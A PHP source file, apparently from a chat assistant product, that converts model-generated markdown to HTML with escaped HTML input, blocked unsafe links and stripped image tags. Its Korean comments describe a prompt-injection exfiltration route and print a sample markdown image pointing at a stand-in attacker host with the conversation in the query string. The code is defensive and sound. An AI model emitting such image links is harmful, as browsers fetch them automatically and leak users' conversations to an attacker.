<?php

namespace WisdomIT\Concierge\Support;

use Illuminate\Support\Str;

/**
 * 모델이 만든 마크다운을 HTML 로 바꾼다.
 *
 * 채팅 화면과 관리자의 대화 보기가 **같은 함수**를 써야 한다 — 아래 두 옵션이
 * 보안의 전부인데, 복사해 두면 한쪽만 고쳐지고 다른 쪽이 XSS 로 남는다.
 */
final class Markdown
{
    public static function render(string $text): string
    {
        $html = Str::markdown($text, [
            // 모델 출력은 사용자 입력만큼이나 신뢰할 수 없다. 도구가 붙으면 게임 콘솔
            // 로그(다른 플레이어가 쓴 텍스트)가 이 경로로 들어온다.
            'html_input' => 'escape',
            'allow_unsafe_links' => false,
        ]);

        // 🔴 이미지는 지운다 — **유출 통로**이기 때문이다 (#50).
        //
        // 위 두 옵션은 XSS 와 javascript: 링크를 막지만 마크다운 이미지 문법은 막지 못한다.
        // 인젝션이 모델에게 `![](https://attacker/?d=<대화내용>)` 를 뱉게 하면, 브라우저가
        // 렌더 시점에 **클릭 없이 자동으로** 그 주소를 부른다. 링크는 사람이 눌러야 하므로
        // 그대로 두고, 자동으로 불려 나가는 것만 없앤다.
        //
        // alt 텍스트는 남겨 둔다 — 무엇이 있었는지는 보여야 한다. src 는 버린다.
        return preg_replace_callback(
            '/<img\b[^>]*>/i',
            function (array $match): string {
                preg_match('/\balt="([^"]*)"/i', $match[0], $alt);

                return trim($alt[1] ?? '') === '' ? '' : '[' . $alt[1] . ']';
            },
            $html,
        );
    }
}
